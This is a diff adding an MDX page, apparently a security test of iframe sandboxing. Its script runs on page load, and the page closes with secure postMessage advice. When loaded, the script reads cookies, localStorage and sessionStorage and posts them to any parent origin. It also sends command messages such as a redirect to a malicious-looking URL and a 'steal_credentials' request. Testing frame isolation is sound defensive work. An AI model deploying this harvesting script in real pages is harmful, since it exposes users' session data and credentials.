@@ -1,0 +1,328 @@
+---
+title: "Cross-Frame Communication Tests"
+description: "PostMessage and cross-frame communication testing"
+icon: "messages"
+---
+
+# Cross-Frame Communication Tests
+
+This test evaluates cross-frame communication mechanisms, including PostMessage API and other communication channels between iframe and parent.
+
+<script>
+{`
+console.log('📡 CROSS-FRAME COMMUNICATION TEST STARTED');
+
+// Test 1: Basic PostMessage to parent
+console.log('--- TEST 1: Basic PostMessage ---');
+if (window.parent) {
+  const testMessage = {
+    type: 'iframe_test',
+    action: 'basic_communication',
+    timestamp: Date.now(),
+    data: {
+      userAgent: navigator.userAgent,
+      location: window.location.href,
+      cookies: document.cookie
+    }
+  };
+  
+  window.parent.postMessage(testMessage, '*');
+  console.log('📤 Basic message sent to parent:', testMessage);
+  
+  window.parent.postMessage(JSON.stringify(testMessage), '*');
+  console.log('📤 Stringified message sent to parent');
+}
+
+// Test 2: Malicious data exfiltration attempt
+console.log('--- TEST 2: Data Exfiltration Attempt ---');
+const sensitiveData = {
+  type: 'data_exfiltration',
+  stolen_data: {
+    localStorage: (() => {
+      try { return Object.keys(localStorage).reduce((acc, key) => ({...acc, [key]: localStorage[key]}), {}); }
+      catch(e) { return 'blocked'; }
+    })(),
+    sessionStorage: (() => {
+      try { return Object.keys(sessionStorage).reduce((acc, key) => ({...acc, [key]: sessionStorage[key]}), {}); }
+      catch(e) { return 'blocked'; }
+    })(),
+    cookies: document.cookie,
+    referrer: document.referrer,
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language
+  }
+};
+
+if (window.parent) {
+  window.parent.postMessage(sensitiveData, '*');
+  console.log('🚨 Sensitive data exfiltration attempted');
+}
+
+// Test 3: Command injection attempts
+console.log('--- TEST 3: Command Injection ---');
+const commandMessages = [
+  { type: 'execute_js', code: 'alert("XSS from iframe!")' },
+  { type: 'redirect_parent', url: 'https://malicious-site.com' },
+  { type: 'steal_credentials', target: 'login_form' },
+  { type: 'modify_dom', action: 'inject_malicious_content' },
+  { type: 'track_user', fingerprint: true }
+];
+
+commandMessages.forEach(cmd => {
+  if (window.parent) {
+    window.parent.postMessage(cmd, '*');
+    console.log('🎯 Command injection attempted:', cmd.type);
+  }
+});
+
+// Test 4: Message listener for responses
+console.log('--- TEST 4: Message Listener Setup ---');
+let messageCount = 0;
+window.addEventListener('message', function(event) {
+  messageCount++;
+  console.log(\`📨 Message #\${messageCount} received:\`, {
+    origin: event.origin,
+    data: event.data,
+    source: event.source === window.parent ? 'parent' : 'unknown',
+    timestamp: new Date().toISOString()
+  });
+  
+  // Attempt to send response back
+  if (event.source) {
+    try {
+      event.source.postMessage({
+        type: 'iframe_response', 
+        originalMessage: event.data,
+        response: 'Message received and processed by iframe'
+      }, event.origin);
+      console.log('📤 Response sent back to sender');
+    } catch (e) {
+      console.log('❌ Response blocked:', e.message);
+    }
+  }
+});
+
+// Test 5: Channel messaging attempts
+console.log('--- TEST 5: MessageChannel Communication ---');
+try {
+  const channel = new MessageChannel();
+  const port1 = channel.port1;
+  const port2 = channel.port2;
+  
+  port1.onmessage = function(e) {
+    console.log('📨 MessageChannel received:', e.data);
+  };
+  
+  if (window.parent) {
+    window.parent.postMessage({
+      type: 'setup_channel',
+      port: port2
+    }, '*', [port2]);
+    console.log('✅ MessageChannel setup attempted');
+  }
+} catch (e) {
+  console.log('❌ MessageChannel blocked:', e.message);
+}
+
+// Test 6: SharedWorker communication
+console.log('--- TEST 6: SharedWorker Communication ---');
+try {
+  const workerBlob = new Blob([\`
+    self.addEventListener('connect', function(e) {
+      const port = e.ports[0];
+      port.postMessage('SharedWorker connected from iframe');
+      port.onmessage = function(event) {
+        port.postMessage('Echo: ' + event.data);
+      };
+    });
+  \`], { type: 'application/javascript' });
+  
+  const workerUrl = URL.createObjectURL(workerBlob);
+  const worker = new SharedWorker(workerUrl);
+  
+  worker.port.onmessage = function(e) {
+    console.log('👷 SharedWorker message:', e.data);
+  };
+  
+  worker.port.postMessage('Hello from iframe SharedWorker');
+  console.log('✅ SharedWorker communication initiated');
+} catch (e) {
+  console.log('❌ SharedWorker communication blocked:', e.message);
+}
+
+// Test 7: BroadcastChannel communication
+console.log('--- TEST 7: BroadcastChannel Communication ---');
+try {
+  const bc = new BroadcastChannel('iframe_hijack_channel');
+  
+  bc.onmessage = function(e) {
+    console.log('📻 BroadcastChannel received:', e.data);
+  };
+  
+  bc.postMessage({
+    type: 'iframe_broadcast',
+    message: 'Broadcasting from iframe',
+    timestamp: Date.now()
+  });
+  
+  console.log('✅ BroadcastChannel message sent');
+} catch (e) {
+  console.log('❌ BroadcastChannel blocked:', e.message);
+}
+
+// Test 8: Storage event communication
+console.log('--- TEST 8: Storage Event Communication ---');
+try {
+  window.addEventListener('storage', function(e) {
+    console.log('🗄️ Storage event received:', {
+      key: e.key,
+      oldValue: e.oldValue,
+      newValue: e.newValue,
+      url: e.url
+    });
+  });
+  
+  // Trigger storage event
+  localStorage.setItem('iframe_communication_test', JSON.stringify({
+    timestamp: Date.now(),
+    message: 'Communication via storage events'
+  }));
+  
+  console.log('✅ Storage event communication initiated');
+} catch (e) {
+  console.log('❌ Storage event communication blocked:', e.message);
+}
+
+// Test 9: URL hash communication
+console.log('--- TEST 9: URL Hash Communication ---');
+try {
+  let hashChangeCount = 0;
+  window.addEventListener('hashchange', function(e) {
+    hashChangeCount++;
+    console.log(\`🔗 Hash change #\${hashChangeCount}:\`, {
+      oldURL: e.oldURL,
+      newURL: e.newURL,
+      hash: window.location.hash
+    });
+  });
+  
+  // Simulate hash-based communication
+  const communicationHash = '#iframe_msg=' + encodeURIComponent(JSON.stringify({
+    type: 'hash_communication',
+    timestamp: Date.now()
+  }));
+  
+  window.location.hash = communicationHash;
+  console.log('✅ Hash communication attempted');
+} catch (e) {
+  console.log('❌ Hash communication blocked:', e.message);
+}
+
+// Test 10: Periodic communication attempts
+console.log('--- TEST 10: Periodic Communication ---');
+let communicationAttempts = 0;
+const communicationInterval = setInterval(() => {
+  communicationAttempts++;
+  
+  if (window.parent) {
+    window.parent.postMessage({
+      type: 'periodic_communication',
+      attempt: communicationAttempts,
+      timestamp: Date.now(),
+      status: 'Still attempting to communicate'
+    }, '*');
+  }
+  
+  console.log(\`📡 Communication attempt #\${communicationAttempts}\`);
+  
+  if (communicationAttempts >= 3) {
+    clearInterval(communicationInterval);
+    console.log('🔄 Periodic communication completed');
+  }
+}, 2000);
+
+// Visual indicator
+const indicator = document.createElement('div');
+indicator.innerHTML = '📡 COMMUNICATION TEST ACTIVE';
+indicator.style.cssText = 'position: fixed; top: 0; left: 0; right: 0; background: #10b981; color: white; text-align: center; padding: 10px; z-index: 9999; font-weight: bold;';
+document.body.insertBefore(indicator, document.body.firstChild);
+
+setTimeout(() => {
+  indicator.remove();
+  console.log('📡 CROSS-FRAME COMMUNICATION TEST COMPLETED');
+}, 8000);
+`}
+</script>
+
+## What This Test Does
+
+This communication test explores various cross-frame communication methods:
+
+1. **Basic PostMessage** - Standard iframe-to-parent communication
+2. **Data Exfiltration** - Attempting to steal sensitive information
+3. **Command Injection** - Sending malicious commands to parent
+4. **Message Listeners** - Setting up bidirectional communication
+5. **MessageChannel** - Advanced port-based communication
+6. **SharedWorker** - Cross-tab communication via shared workers
+7. **BroadcastChannel** - Broadcasting messages across contexts
+8. **Storage Events** - Communication via localStorage changes
+9. **Hash Communication** - URL fragment-based messaging
+10. **Periodic Communication** - Persistent communication attempts
+
+## Expected Results
+
+In a secure implementation:
+- **PostMessage should work** (this is intended communication)
+- **Message origin should be validated** by the parent
+- **Malicious commands should be filtered** by the parent
+- **Cross-origin restrictions should apply** to other methods
+
+## Security Implications
+
+Communication channels can be used for:
+- **Legitimate iframe integration** ✅
+- **Data exfiltration attacks** ❌  
+- **Command injection** ❌
+- **Cross-site communication** ❌
+- **User tracking** ❌
+
+<Info>
+PostMessage is designed to be a secure communication method, but the **receiving end must validate origins and sanitize data** to prevent abuse.
+</Info>
+
+## Best Practices
+
+For secure cross-frame communication:
+
+1. **Validate message origins** - Check `event.origin` against allowlisted domains
+2. **Sanitize message data** - Never execute arbitrary code from messages
+3. **Use structured data** - Define clear message schemas and validate them
+4. **Implement timeouts** - Prevent infinite communication loops
+5. **Log suspicious activity** - Monitor for unusual communication patterns
+
+```javascript
+// Secure message handler example
+window.addEventListener('message', function(event) {
+  // Validate origin
+  if (!['https://trusted-domain.com'].includes(event.origin)) {
+    console.warn('Rejected message from untrusted origin:', event.origin);
+    return;
+  }
+  
+  // Validate message structure
+  if (!event.data || typeof event.data !== 'object' || !event.data.type) {
+    console.warn('Invalid message format');
+    return;
+  }
+  
+  // Handle only allowlisted message types
+  switch (event.data.type) {
+    case 'allowed_action':
+      handleAllowedAction(event.data);
+      break;
+    default:
+      console.warn('Unknown message type:', event.data.type);
+  }
+});
+```
